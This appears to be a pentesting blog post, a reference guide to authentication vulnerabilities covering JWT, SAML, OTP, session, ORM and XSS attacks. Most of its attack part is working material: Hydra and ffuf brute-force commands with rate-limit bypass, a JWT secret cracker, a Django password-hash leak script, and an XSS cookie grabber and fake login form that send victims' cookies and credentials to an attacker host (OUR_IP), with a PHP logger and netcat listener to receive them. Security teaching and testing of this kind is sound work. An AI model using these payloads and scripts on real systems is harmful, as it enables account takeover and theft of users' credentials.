---
layout: post
title: A Guide to Authentication Vulnerabilities
date: 2026-07-01 00:00:00 +0000
categories: [Notes, Web Security, Authentication Vulnerabilities]
tags:
  - Authentication
  - WebSecurity
  - OWASP
  - JWT
  - SAML
  - BruteForce
  - SessionHijacking
  - MFA
  - Pentesting
description: A comprehensive, structured guide to understanding, exploiting, and preventing authentication vulnerabilities — covering 18 vulnerability classes, tools, commands, and step-by-step methodology.
image: /assets/labs/authenticationv/photo.png
paginate: true
published: true
---

# Authentication Vulnerabilities — Complete Reference
**[Web Authentication & Identity Attacks] · Full Guide**

> [!IMPORTANT]
> Authentication vulnerabilities arise from insecure implementation of identity verification mechanisms — knowledge-based (passwords), ownership-based (tokens, OTPs), and inherence-based (biometrics) — enabling unauthorized access, privilege escalation, and full account takeover.

---

## Why You Care

> [!INFO] Attacker Motivation
> Exploiting auth flaws grants unauthorized access to applications — impacting confidentiality (other users' data), integrity (modifying data), and availability (deleting users/data). They often chain with other bugs for RCE. A single default credential, a missing signature check on a JWT/SAML, a 4-digit OTP without rate limiting, or a verbose error message can be the entire difference between locked out and Domain Admin.

---

## Authentication Fundamentals

> [!NOTE] AuthN vs AuthZ
> - **Authentication (AuthN)** — Confirms identity; first defense against unauthorized access
> - **Authorization (AuthZ)** — Grants resource access based on policies after AuthN succeeds

> [!NOTE] The Three Pillars
> - **Knowledge (something you know)** — passwords, PINs, security questions
> - **Ownership (something you possess)** — ID cards, tokens, authenticator apps
> - **Inherence (something you are)** — fingerprints, facial patterns, voice recognition

> [!NOTE] Multi-Factor Authentication (MFA)
> - **Single-Factor (SFA)** — one method only (e.g., password alone)
> - **Multi-Factor (MFA)** — two or more methods (e.g., password + device)
> - **Two-Factor (2FA)** — exactly two factors

> [!WARNING]
> Biometrics cannot be reset. A leaked fingerprint or facial scan is compromised permanently — unlike passwords, you cannot issue a new face.

---

## Vulnerability Classes

### 1. Weak Password Requirements

> [!NOTE] Weak Password Requirements
> - **No controls** — blank/short passwords, dictionary words, username match, or default passwords unchanged
> - **Impact** — Trivial brute-force, credential stuffing, or guess access

### 2. Improper Restriction of Authentication Attempts

> [!NOTE] Improper Restriction
> - **No lockout** — unlimited brute force on login, OTP/MFA, and password change pages
> - **Bypass vectors** — `X-Forwarded-For` header spoofing tricks IP-based rate limiting
> - **CAPTCHA flaws** — Solution leaked in HTTP response body or page metadata; AI/ML solvers bypass modern challenges

### 3. Verbose Error Messages

> [!NOTE] Verbose Error Messages
> - **Username enumeration** — "Incorrect username" vs "Incorrect password" differences
> - **Oracle types** — Different status codes, redirects, on-screen text, HTML source, or response timing
> - **Impact** — Attacker builds valid username list, then password-sprays

### 4. Vulnerable Transmission of Credentials

> [!NOTE] Vulnerable Transmission
> - **No HTTPS** — Credentials sent in cleartext over HTTP
> - **URL leakage** — Credentials in GET query strings or cookies
> - **Impact** — Network sniffing yields credentials

### 5. Insecure Forgot Password Functionality

> [!NOTE] Insecure Password Reset
> - **Weak security questions** — Generic questions ("What city were you born in?") brute-forceable with OSINT wordlists
> - **Logic bugs** — App fails to verify `username` in the final reset request matches who answered the question
> - **Predictable recovery URLs** — Tokens in URL that don't expire or are sequential
> - **Impact** — Full account takeover without knowing the password

### 6. Defects in Multistage Login (MFA/2FA)

> [!NOTE] Multistage Login Defects
> - **Short TOTP codes** — 4-digit codes = 10,000 variations, brute-forceable in minutes
> - **No rate limiting** — Successive incorrect TOTP submissions not blocked
> - **Cookie manipulation** — Changing `account` cookie in second step bypasses verification
> - **Session marking** — Once correct OTP supplied, session marked fully authenticated

### 7. Insecure Storage of Credentials

> [!NOTE] Insecure Storage
> - **Plaintext** — Passwords stored as-is in database
> - **Simple encryption** — AES256 + Base64 (reversible)
> - **Weak hashes** — MD5, SHA256 without salt
> - **Impact** — Post-RCE extraction yields all credentials

### 8. Default Authentication Credentials

> [!NOTE] Default Credentials
> - **Common pairs** — `admin:password`, `admin@admin.com:password`, vendor-specific defaults
> - **Discovery** — CIRT.net, SecLists, Google `[product] installation instructions`
> - **Impact** — Instant authenticated access, easiest path to initial foothold

### 9. HTTP Basic Auth Weaknesses

> [!NOTE] Basic Auth Mechanism
> - **Process** — Server returns 401 + `WWW-Authenticate` header → browser shows login dialog
> - **Encoding** — `username:password` → Base64 → `Authorization: Basic <encoded>`
> - **Weakness** — Base64 is encoding, not encryption; trivially decoded
> - **Production note** — Rarely used in modern web apps; still common in APIs, IoT, and embedded devices

```http
GET /protected_resource HTTP/1.1
Host: www.example.com
Authorization: Basic YWxpY2U6c2VjcmV0MTIz
```

### 10. Session Token Attacks

> [!NOTE] Low Entropy / Brute-Force
> - **Short tokens** — 4-char token (`session=a5fd`) easily enumerated
> - **Static wrappers** — 32-char tokens may have only 4 dynamic chars
> - **Detection** — Capture 5-10 tokens, compare to find static vs dynamic parts

> [!NOTE] Sequential Tokens
> - **Incrementing IDs** — `141233`, `141234` — increment or decrement to hijack other sessions

> [!NOTE] Predictable & Encoded Tokens
> - **Base64** — `dXNlcj1odGItc3RkbnQ7cm9sZT11c2Vy` decodes to `user=htb-stdnt;role=user`
> - **Hexadecimal** — Tokens as hex strings encoding serialized objects
> - **Weak encryption** — Difficult in blackbox; still leads to privilege escalation

> [!WARNING]
> Forged tokens fail if the server validates integrity signatures (HMAC) server-side.

### 11. Session Fixation

> [!NOTE] Session Fixation
> - **Vulnerability** — App accepts session ID via GET parameter (`?sid=a1b2c3d4e5f6`) and does not rotate after login
> - **Attack flow** — Attacker provides known token → victim authenticates with it → attacker hijacks
> - **Detection** — Check if `Set-Cookie` value changes after login; if not, app is vulnerable
> - **Remediation** — `session_regenerate_id()` in PHP

> [!NOTE] Improper Session Timeout
> - **Risk** — No timeout means hijacked token remains valid indefinitely

### 12. Execution After Redirect (EAR)

> [!NOTE] Direct Access / EAR
> - **EAR flaw** — PHP calls `header("Location: index.php")` without `exit;`; execution continues, sending protected HTML
> - **Exploitation** — Intercept response with Burp Suite, change `302 Found` → `200 OK`
> - **Root cause** — App relies on login page as "gatekeeper" but fails to verify auth state on each endpoint

```php
if(!$_SESSION['active']) {
    header("Location: index.php");
}
// ... execution continues, sending protected HTML
```

> [!WARNING]
> The browser normally hides the leak by silently following the redirect. Only intercepting and modifying the response reveals the protected data.

### 13. Auth Bypass via Parameter Manipulation

> [!NOTE] Parameter Manipulation
> - **Behavior** — Auth depends on presence/value of HTTP parameter (`user_id=183` in `/admin.php?user_id=183`)
> - **Test** — Remove parameter; if redirected to login despite valid `PHPSESSID`, parameter is required for auth
> - **Relationship** — Closely related to Insecure Direct Object Reference (IDOR)

### 14. JWT Attacks

> [!NOTE] JWT None Algorithm
> - **`None` algorithm enabled** — JWT libraries include `None` for debugging; if not disabled, server accepts unsigned tokens
> - **Empty signature match** — Server computes empty HMAC for `None`, matching attacker's empty signature
> - **Impact** — Complete auth bypass without any cryptographic material

> [!NOTE] JWT Signature Not Verified
> - **Missing validation** — Server never calls `verify()` before trusting claims
> - **Tamper test** — Modifying payload (e.g., `username` → `admin`) still authenticates
> - **Impact** — Any user impersonates any other user with zero crypto knowledge

> [!NOTE] JWT Weak Secret Brute-Force
> - **Low-entropy secret** — Short, dictionary-based secret used for HMAC-SHA256
> - **Offline attack** — Brute-force locally without server interaction (one token needed)
> - **Impact** — Cracked secret → forge tokens for any user; completely undetectable (valid signature)

> [!WARNING]
> For `None` algorithm: servers may expect lowercase `"none"`. Try both `"None"` and `"none"`. For weak secret: URL-safe base64 strips `=` padding — ensure your `sign()` function matches server implementation exactly.

### 15. SAML Attacks

> [!NOTE] SAML Response Tampering
> - **Missing signature validation** — SP never verifies SAMLResponse/Assertion signature
> - **Blind trust** — Any valid-format SAMLResponse accepted
> - **Impact** — Modify `<NameID>` to impersonate any user

> [!NOTE] SAML Signature Stripping
> - **Signature not enforced** — SP does not require `<ds:Signature>` block
> - **Even simpler** — Delete entire signature block after NameID tamper
> - **Fallback** — If stripped response rejected, leave empty `<ds:Signature/>` tag

> [!NOTE] SAML Comment Injection
> - **Parser inconsistency** — IDP and SP handle XML comments (`<!-- -->`) differently
> - **Signature still valid** — IDP signs with comments; SP verifies after comment removal
> - **No tampering needed** — Register with `admin<!--x-->@libcurl.so`, SP interprets as `admin@libcurl.so`

> [!WARNING]
> SAMLResponse is typically deflate-compressed → Base64-encoded → URL-encoded. Ensure you decompress properly at each layer.

### 16. ORM Leak (Filter Oracle)

> [!NOTE] Django ORM Information Leak
> - **Root cause** — `User.objects.filter(**request.data)` allows attacker-controlled column and operator
> - **Filter oracle** — Response length changes when filter matches vs doesn't
> - **Operator** — `password__startswith` leaks hash one character at a time
> - **Character set** — `string.ascii_letters + string.digits + '$/=+_'`
> - **Known prefix** — `pbkdf2_`
> - **Impact** — Full password hash leaked; the hash itself is the key (no cracking needed)

> [!WARNING]
> Always include `'username': 'admin'` in filters to target the right account. Rate-limit to avoid detection. Do not crack the hash — the hash is the flag/key.

### 17. IDOR via Predictable Identifiers

> [!NOTE] MongoDB ObjectId IDOR
> - **Structure** — 4 bytes (timestamp) + 5 bytes (random) + 3 bytes (incrementing counter)
> - **Attack** — Decode own ObjectId timestamp → adjust backwards → brute-force 3-byte counter
> - **Wider windows** — Admin may be created days earlier; loop 7-day timestamp range

> [!NOTE] UUIDv1 IDOR
> - **Structure** — 60-bit timestamp + 14-bit clock sequence + 48-bit node (MAC)
> - **Attack** — Same creation time means same timestamp + MAC; only clock sequence differs
> - **Technique** — Brute-force small range of clock sequence values

> [!WARNING]
> MongoDB ObjectIds' random 5 bytes and starting counter differ per process. Only the first 4 bytes (timestamp) and last 3 bytes (counter) are predictable.

### 18. XSS Credential Theft & Session Hijacking

> [!NOTE] XSS Session Hijacking
> - **Cookie grabber** — `new Image().src='http://OUR_IP/?c='+document.cookie`
> - **Blind XSS** — Payload fires on pages you can't see (admin panel); payload calls back to confirm
> - **Impact** — Full account access without credentials

> [!NOTE] XSS Phishing (Fake Login Forms)
> - **Technique** — `document.write('<form action=http://OUR_IP>...')` injects fake login
> - **Stealth** — Remove original elements + `<!--` hides residual HTML
> - **Listener** — netcat or PHP logger captures submitted credentials
> - **Impact** — Credentials harvested from users who trust the legitimate site

---

## Commands & Tools

### Hydra — Brute Force (Linux)

> [!EXAMPLE] Install Hydra
> ```bash
> sudo apt-get -y update
> sudo apt-get -y install hydra
> ```

> [!EXAMPLE] General Syntax
> ```bash
> hydra [login_options] [password_options] [attack_options] [service_options]
> ```

| Flag | Meaning |
|:-----|:--------|
| `-l LOGIN` | Single username |
| `-L FILE` | Username list file |
| `-p PASS` | Single password |
| `-P FILE` | Password list file |
| `-t TASKS` | Parallel tasks (threads) |
| `-f` | Stop after first success |
| `-s PORT` | Non-default port |
| `-v` / `-V` | Verbose output |
| `service://server` | Target with protocol prefix |
| `path` | URL endpoint (for http-post-form) |
| `params` | Body data with `^USER^` / `^PASS^` placeholders |
| `condition` | `F=` failure string or `S=` success string |
| `-M FILE` | List of target servers |
| `-x min:max:chars` | Generate all passwords min-max chars from charset |

> [!EXAMPLE] HTTP Basic Auth
> ```bash
> hydra -L usernames.txt -P passwords.txt www.example.com http-get
> ```

> [!EXAMPLE] HTTP POST Form
> ```bash
> hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
> ```

> [!EXAMPLE] SSH
> ```bash
> hydra -l root -p toor -M targets.txt ssh
> ```

> [!EXAMPLE] FTP (non-standard port)
> ```bash
> hydra -s 2121 -V ftp.example.com ftp
> ```

> [!EXAMPLE] RDP (pattern generation)
> ```bash
> hydra -l administrator -x 6:8:[characters] 192.168.1.100 rdp
> ```

> [!EXAMPLE] MySQL
> ```bash
> hydra -l root -P pass.txt mysql://192.168.1.100
> ```

> [!EXAMPLE] MSSQL
> ```bash
> hydra -l sa -P pass.txt mssql://192.168.1.100
> ```

> [!EXAMPLE] SMTP / POP3 / IMAP
> ```bash
> hydra -l admin -P pass.txt smtp://mail.server.com
> hydra -l user@example.com -P pass.txt pop3://mail.server.com
> hydra -l user@example.com -P pass.txt imap://mail.server.com
> ```

> [!EXAMPLE] VNC
> ```bash
> hydra -P pass.txt vnc://192.168.1.100
> ```

| Service | Protocol | Example |
|:--------|:---------|:--------|
| **ftp** | FTP | `hydra -l admin -P pass.txt ftp://target` |
| **ssh** | SSH | `hydra -l root -P pass.txt ssh://target` |
| **http-get/post** | HTTP | `hydra -l admin -P pass.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"` |
| **smtp** | SMTP | `hydra -l admin -P pass.txt smtp://mail.server` |
| **pop3** | POP3 | `hydra -l user@example.com -P pass.txt pop3://mail.server` |
| **imap** | IMAP | `hydra -l user@example.com -P pass.txt imap://mail.server` |
| **mysql** | MySQL | `hydra -l root -P pass.txt mysql://target` |
| **mssql** | MSSQL | `hydra -l sa -P pass.txt mssql://target` |
| **vnc** | VNC | `hydra -P pass.txt vnc://target` |
| **rdp** | RDP | `hydra -l admin -P pass.txt rdp://target` |

> [!WARNING]
> Brute force is noisy and may trigger account lockout. Password spraying (one password across many users) is quieter and more effective.

### Medusa — FTP Brute Force (Linux)

> [!EXAMPLE] FTP Brute Force
> ```bash
> medusa -u admin -P passwords.txt -h 192.168.1.100 -M ftp
> ```

### ffuf — Web Fuzzing (Multi)

> [!EXAMPLE] Brute-force security question answer
> ```bash
> ffuf -w ./city_wordlist.txt -u http://pwreset.htb/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" -d "security_response=FUZZ" -fr "Incorrect response."
> ```

> [!EXAMPLE] Bypass rate limiting via header spoofing
> ```bash
> ffuf -w wordlist.txt -u http://target/login.php -X POST -H "X-Forwarded-For: FUZZ" -d "user=admin&pass=FUZZ"
> ```

> [!EXAMPLE] Brute-force 2FA OTP (4-digit)
> ```bash
> ffuf -w tokens.txt -u http://target:30719/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=8hmgll4eoj91s34rpvc570h8gf" -d "otp=FUZZ" -fr "Invalid OTP"
> ```

| Flag | Meaning |
|:-----|:--------|
| `-w` | Wordlist file |
| `-u` | Target URL |
| `-X` | HTTP method |
| `-H` | Custom header (with FUZZ placeholder) |
| `-b` | Session cookie |
| `-d` | POST data with FUZZ placeholder |
| `-fr` | Filter regex to hide failure responses |

> [!WARNING]
> Maintain session state via cookie for multi-step flows. High velocity may trigger WAF or account lockout.

### Burp Suite — Web Auth Testing (Cross-Platform)

> [!EXAMPLE] Automated login form fuzzing
> ```text
> Burp Suite → Intercept request → Send to Intruder → Positions → Payloads → Start
> ```

| Feature | Purpose |
|:--------|:--------|
| Positions | Mark username/password field values |
| Payloads | Load username/password wordlists |
| Grep-Match | Identify success/failure response strings |
| Decoder | Base64 decode/encode JWT, SAML, cookies |

> [!EXAMPLE] EAR Response Manipulation
> Intercept server response → right-click → **Do intercept > Response to this request** → modify status line.

| Action | Method |
|:-------|:-------|
| Intercept response | `Do intercept > Response to this request` |
| Status swap | `HTTP/1.1 302 Found` → `HTTP/1.1 200 OK` |

### seq — Generate OTP List (Linux/macOS)

> [!EXAMPLE] Generate 4-digit token list (0000-9999)
> ```bash
> seq -w 0 9999 > tokens.txt
> ```

| Flag | Meaning |
|:-----|:--------|
| `-w` | Zero-pad numbers to equal width |

### cut / grep / wc — Wordlist Prep (Linux/macOS)

> [!EXAMPLE] Extract city names from CSV
> ```bash
> cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt
> ```

> [!EXAMPLE] Filter by region
> ```bash
> cat world-cities.csv | grep Germany
> ```

> [!EXAMPLE] Verify wordlist size
> ```bash
> wc -l city_wordlist.txt
> ```

### base64 — Token Tampering (Linux/macOS)

> [!EXAMPLE] Decode Base64 session token
> ```bash
> echo -n '<TOKEN>' | base64 -d
> ```

> [!EXAMPLE] Forge admin token
> ```bash
> echo -n 'user=htb-stdnt;role=admin' | base64
> ```

### xxd — Hex Encode Tokens (Linux/macOS)

> [!EXAMPLE] Hex-encode admin payload
> ```bash
> echo -n 'user=htb-stdnt;role=admin' | xxd -p
> ```

| Flag | Meaning |
|:-----|:--------|
| `-p` | Plain hex dump (continuous, no offsets) |

### Python — JWT Weak Secret Brute-Force

> [!EXAMPLE] HMAC-SHA256 brute-force script
> ```python
> import hmac, hashlib, base64
>
> jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjpudWxsfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"
> h, p, s = jwt.split(".")
>
> def sign(key, msg):
>     return base64.urlsafe_b64encode(hmac.new(key, msg, hashlib.sha256).digest()).decode().rstrip('=')
>
> with open("dic", "r") as f:
>     for line in f:
>         line = line.strip()
>         if sign(line.encode(), (h+"."+p).encode()) == s:
>             print("Key found:", line)
>             break
> ```

> [!WARNING]
> Wordlist must contain the exact secret format. URL-safe base64 strips `=` padding — `sign()` must match server implementation exactly.

### Python — SAML Response Tampering

> [!EXAMPLE] Decode, tamper, re-encode SAMLResponse
> ```python
> import base64, gzip
>
> # Decode
> decoded = base64.b64decode(saml_response)
> xml = gzip.decompress(decoded)  # if compressed
>
> # Modify NameID
> xml = xml.replace(b'user@example.com', b'admin@libcurl.so')
>
> # Re-encode
> new_response = base64.b64encode(gzip.compress(xml))
> ```

### Python — Django ORM Password Hash Leak

> [!EXAMPLE] Automated character-by-character leak
> ```python
> import requests, string, sys
> from concurrent.futures import ThreadPoolExecutor
>
> TARGET = 'http://target/api/user/'
> CHARS = string.ascii_letters + string.digits + '$/=+_'
>
> def worker(username, known, c):
>     r = requests.post(TARGET, json={
>         'username': username,
>         'password__startswith': known + c
>     })
>     return len(r.json()) > 0, known + c
>
> def exploit(username):
>     dumped = ''
>     while True:
>         found = False
>         with ThreadPoolExecutor(max_workers=20) as ex:
>             futures = [ex.submit(worker, username, dumped, c) for c in CHARS]
>             for f in futures:
>                 ok, val = f.result()
>                 if ok:
>                     dumped = val
>                     found = True
>                     break
>         if not found:
>             break
>     print(f'password: {dumped}')
> ```

### Ruby — MongoDB ObjectId Timestamp Extraction

> [!EXAMPLE] Extract timestamp from ObjectId
> ```ruby
> str = "678ee5b9d4de890009e7f4e7"
> time = Time.at(str.scan(/../).map { |pair| pair.to_i(16).chr }.join[0..3].unpack1('N'))
> puts time
> ```

> [!EXAMPLE] Generate new timestamp hex
> ```ruby
> timestamp = 1700000000
> puts [timestamp].pack("N").unpack1("H*")
> ```

### Python — UUIDv1 Parsing

> [!EXAMPLE] Extract timestamp/node/clock_seq from UUIDv1
> ```python
> import uuid
> u = uuid.UUID('f47ac10b-58cc-4372-a567-0e02b2c3d479')
> print(u.time)        # 100-ns intervals since 1582-10-15
> print(u.node)        # MAC address
> print(u.clock_seq)   # clock sequence
> ```

### XSS Cookie Stealer — JavaScript + PHP

> [!EXAMPLE] Cookie grabber (script.js)
> ```javascript
> new Image().src='http://OUR_IP/index.php?c='+document.cookie
> ```

> [!EXAMPLE] PHP logger (index.php)
> ```php
> <?php
> if (isset($_GET['c'])) {
>     $list = explode(";", $_GET['c']);
>     foreach ($list as $key => $value) {
>         $cookie = urldecode($value);
>         $file = fopen("cookies.txt", "a+");
>         fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
>         fclose($file);
>     }
> }
> ?>
> ```

> [!EXAMPLE] Start PHP listener
> ```bash
> mkdir /tmp/tmpserver && cd /tmp/tmpserver
> sudo php -S 0.0.0.0:80
> ```

### XSS Phishing — Fake Login Form

> [!EXAMPLE] Inject fake login form
> ```javascript
> document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
> ```

> [!EXAMPLE] Start PHP credential logger
> ```bash
> mkdir /tmp/tmpserver && cd /tmp/tmpserver
> sudo php -S 0.0.0.0:80
> ```

> [!EXAMPLE] Or use netcat for quick capture
> ```bash
> sudo nc -lvnp 80
> ```

---

## Steps

> [!TIP] Step 1: Identify Technology
> Determine the target vendor, application, or framework. Check for version in HTTP headers, cookies, HTML comments, or error pages.

> [!TIP] Step 2: Test Default Credentials
> Search CIRT.net and Google for `"[app] default credentials"` or `"[app] installation instructions"`. Try `admin:password`, `admin@admin.com:password`, `root:toor`.

> [!TIP] Step 3: Enumerate Usernames
> Submit valid vs invalid usernames. Compare status codes, redirects, on-screen text, HTML source, and response timing. If differences exist, build a username list.

> [!TIP] Step 4: Test Password Complexity & Lockout
> Attempt to register/change passwords to weak values (blank, short, username). Submit 10+ bad logins; if still able to log in, no lockout exists.

> [!TIP] Step 5: Test Rate Limits & CAPTCHA
> Fire high-velocity requests; look for "429 Too Many Requests" or increased latency. Add `X-Forwarded-For: FUZZ` if IP-based rate limiting. Check page source for leaked CAPTCHA solutions.

> [!TIP] Step 6: Brute-Force Authentication
> ```bash
> hydra -l <user> -P <wordlist> <target> <service>
> ```
> Or for web forms:
> ```bash
> hydra -L users.txt -P passwords.txt -f <IP> -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
> ```

> [!TIP] Step 7: Test 2FA/OTP Bypass
> ```bash
> seq -w 0 9999 > tokens.txt
> ffuf -w tokens.txt -u http://target/2fa.php -X POST -d "otp=FUZZ" -fr "Invalid OTP"
> ```
> If rate-limited, add `X-Forwarded-For` spoofing.

> [!TIP] Step 8: Test Forgot Password Functionality
> Walk through password reset with a proxy. Look for predictable recovery URLs, URLs that don't expire, or sensitive info in the URL. Brute-force security questions with OSINT wordlists.

> [!TIP] Step 9: Exploit Password Reset Logic Bug
> Intercept the final reset request at `/reset_password.php`. Swap the `username` parameter from your account to the target (e.g., `admin`). If the app doesn't verify consistency, you take over the account.

> [!TIP] Step 10: Capture & Analyze Session Tokens
> Gather 5-10 tokens. Check for: same `Set-Cookie` after login (fixation), short length (low entropy), sequential IDs, Base64/Hex encoding. Decode and tamper:
> ```bash
> echo -n '<TOKEN>' | base64 -d
> echo -n 'user=htb-stdnt;role=admin' | base64
> ```

> [!TIP] Step 11: Test Direct Access & EAR
> Request protected endpoints (e.g., `/admin.php`) without authentication. Intercept the response; if 302 contains HTML body, change to `200 OK` in Burp Suite.

> [!TIP] Step 12: Test Parameter Manipulation
> After login, note URL parameters (`user_id=183`). Remove the parameter; if redirected despite valid session, parameter is auth-critical. Brute-force admin IDs.

> [!TIP] Step 13: Test JWT Security
> Decode JWT via `jwt.io`. Try: changing `alg` to `None` with empty signature, modifying payload while keeping original signature (no verify), brute-forcing weak secret offline with Python + wordlist.

> [!TIP] Step 14: Test SAML Security
> Intercept SAMLResponse POST. Decode Base64 → decompress (deflate). Try: modifying `<NameID>` (no signature verify), stripping entire `<ds:Signature>` block, or registering with `admin<!--x-->@target.com` (comment injection).

> [!TIP] Step 15: Test ORM Filter Injection
> If the app uses Django, POST to API endpoints with JSON like:
> ```json
> {"username": "admin", "password__startswith": "pbkdf2_"}
> ```
> If response is non-empty, leak the full hash character-by-character with the Python script.

> [!TIP] Step 16: Test IDOR via Identifier Manipulation
> For MongoDB ObjectIds: decode timestamp, adjust backwards, brute-force counter. For UUIDv1: parse timestamp/node, brute-force clock sequence.

> [!TIP] Step 17: XSS Credential Theft
> For session hijacking: inject `<script src=http://OUR_IP/script.js></script>` and capture cookies. For phishing: inject fake login form via `document.write()` pointing to your server.

> [!TIP] Step 18: Monitor Traffic
> Check if credentials appear in URL query strings, cookies, or if HTTP requests redirect to HTTPS. Check for `Authorization: Basic <base64>` headers.

> [!TIP] Step 19: Check Storage (Post-RCE)
> If RCE gained, review backend database for plaintext or weakly hashed passwords. Interview developers about storage practices.

> [!TIP] Step 20: Remediate
> Implement MFA, enforce strong password policies, use genereric error messages, rotate session IDs after login, add `exit;` after `header()`, validate signatures server-side, rate-limit auth endpoints, and follow NIST 800-63-b guidelines.

---

## Quick Reference Table

| Goal | Tool / Command | Platform |
|:-----|:---------------|:---------|
| Brute-force auth | `hydra -l <user> -P <wordlist> <target> <service>` | Linux |
| HTTP Basic Auth | `hydra -L users.txt -P pass.txt target http-get` | Linux |
| Web Login Form | `hydra -l user -P pass.txt target http-post-form "/login:user=^USER^&pass=^PASS^:S=302"` | Linux |
| SSH brute-force | `hydra -l root -p toor -M targets.txt ssh` | Linux |
| FTP brute-force | `hydra -s 2121 -V ftp.example.com ftp` | Linux |
| FTP brute-force (Medusa) | `medusa -u <user> -P <wordlist> -h <target> -M ftp` | Linux |
| RDP (pattern gen) | `hydra -l admin -x 6:8:chars target rdp` | Linux |
| MySQL brute-force | `hydra -l root -P pass.txt mysql://target` | Linux |
| MSSQL brute-force | `hydra -l sa -P pass.txt mssql://target` | Linux |
| SMTP brute-force | `hydra -l admin -P pass.txt smtp://mail.server` | Linux |
| POP3/IMAP brute-force | `hydra -l user@example.com -P pass.txt pop3://mail.server` | Linux |
| VNC brute-force | `hydra -P pass.txt vnc://target` | Linux |
| Web auth fuzzing | Burp Intruder | Cross-Platform |
| Brute-force 2FA OTP | `seq -w 0 9999 > tokens.txt && ffuf -w tokens.txt -u <url> -d "otp=FUZZ" -fr "Invalid"` | Multi |
| Brute-force sec question | `ffuf -w wordlist.txt -u <url> -d "security_response=FUZZ" -fr "Incorrect"` | Multi |
| Bypass rate limiting | `X-Forwarded-For: FUZZ` + ffuf/Burp Intruder | Multi |
| Generate OTP list | `seq -w 0 9999 > tokens.txt` | Linux/macOS |
| Extract city list | `cat world-cities.csv \| cut -d ',' -f1 > words.txt` | Linux/macOS |
| Decode Base64 token | `echo -n '<TOKEN>' \| base64 -d` | Linux/macOS |
| Hex-encode payload | `echo -n '...' \| xxd -p` | Linux/macOS |
| Decode JWT | `jwt.io` or `base64 -d` | Web / CLI |
| Forge JWT (None alg) | Change `alg` to `None`, empty signature | Any |
| Crack JWT secret | Python HMAC-SHA256 script + wordlist | CLI |
| Decode SAML | `base64 -d` then `zlib` | CLI |
| Manipulate SAML | Burp Decoder → Base64 → deflate → edit → deflate → Base64 | Any |
| Detect session fixation | Check if `Set-Cookie` changes after login | Browser/Proxy |
| EAR response swap | Burp: `302 Found` → `200 OK` | Burp |
| Find leaked CAPTCHA | Inspect HTTP response body | Burp/Browser |
| Leak password hash | Python `password__startswith` oracle | Python |
| Decode Mongo ObjectId | Ruby `unpack1('N')` | Ruby |
| Parse UUIDv1 | `uuid.UUID(str)` in Python | Python |
| XSS cookie grabber | `new Image().src='http://OUR_IP/?c='+document.cookie` | JavaScript |
| XSS fake login | `document.write('<form action=http://OUR_IP>...</form>')` | JavaScript |
| Credential listener | `sudo nc -lvnp 80` or PHP `index.php` + `php -S 0.0.0.0:80` | Linux |
| Default credential search | CIRT.net, SecLists | Web |
| Lockout testing | Manual repeated login attempts | All |
| Username enumeration | Response comparison + wordlist | All |
| Multistage login test | Proxy (Burp/ZAP) walkthrough | All |

---

## Attack Flow Summary

> [!DANGER] Attack Flow — Full Auth Assessment
> ```
> 1. Identify technology & version
> 2. Test default credentials (CIRT.net, Google, SecLists)
> 3. Enumerate usernames via verbose errors
> 4. Test password complexity & lockout mechanisms
> 5. Test rate limiting & CAPTCHA bypass
>    ├── X-Forwarded-For spoofing
>    └── Inspect response for leaked CAPTCHA solution
> 6. Brute-force credentials (Hydra / ffuf / Burp Intruder)
> 7. Test 2FA/OTP
>    ├── 4-digit OTP brute-force (seq + ffuf)
>    └── Cookie manipulation in multistep login
> 8. Exploit password reset
>    ├── Brute-force security questions with OSINT wordlists
>    └── Swap username parameter in final reset request
> 9. Capture & analyze session tokens
>    ├── Check for fixation (same Set-Cookie after login)
>    ├── Check entropy & sequential patterns
>    └── Decode Base64/Hex → tamper → re-encode
> 10. Test direct access & EAR (302 → 200 swap)
> 11. Test parameter manipulation (remove/brute-force user_id)
> 12. Test JWT
>     ├── None algorithm bypass
>     ├── Signature not verified (tamper payload, keep sig)
>     └── Weak secret brute-force offline
> 13. Test SAML
>     ├── Response tampering (modify NameID)
>     ├── Signature stripping (remove <ds:Signature>)
>     └── Comment injection (admin<!--x-->@target)
> 14. Test ORM filter injection (Django __startswith oracle)
> 15. Test IDOR via predictable identifiers
>     ├── MongoDB ObjectId timestamp manipulation
>     └── UUIDv1 clock sequence brute-force
> 16. XSS credential theft
>     ├── Session hijacking via cookie grabber
>     └── Phishing via fake login form injection
> 17. Monitor traffic for credential leakage
> 18. Post-RCE: extract and analyze stored credentials
> ```

---

## Key Comparisons

| Feature | Weak / Insecure | Secure |
|:--------|:----------------|:-------|
| Password storage | Plaintext, AES256+B64, MD5, SHA256 (unsalted) | bcrypt, argon2, scrypt |
| Session token | Static after login (fixation), short/sequential, Base64/Hex encoded | Rotated on login, random 128+ bits, cryptographically signed |
| Error messages | "Incorrect username" vs "Incorrect password" | Generic: "Invalid credentials" |
| Rate limiting | None or IP-based only | Multi-layer: IP + account + behavioral + progressive delay |
| 2FA OTP | 4 digits, no rate limit, single attempt window | 6+ digits, rate-limited, timed expiry, limited attempts |
| JWT validation | `None` algorithm accepted, no signature verify, weak secret | Algorithm whitelist, strict verify(), strong random secret |
| SAML validation | No signature check, accepts stripped signatures | Required and validated `ds:Signature` |
| Password reset | Predictable URL, no expiry, no user consistency check | Short-lived random token, email verification, user-bound |
| AuthN factor count | Single-factor (password only) | Multi-factor (2+ categories) |

---

## OWASP Top 10 Context

> [!NOTE] OWASP Rankings
> - **2013/2017** — A2: Broken Authentication
> - **2021** — A7: Identification and Authentication Failures

---

## Prevention Strategies

> [!NOTE] Prevention
> - **Implement MFA** — Use multi-factor authentication wherever possible
> - **Credential Handling** — Change all default credentials, use only HTTPS for transmission
> - **Method Restrictions** — Use only POST requests to send credentials
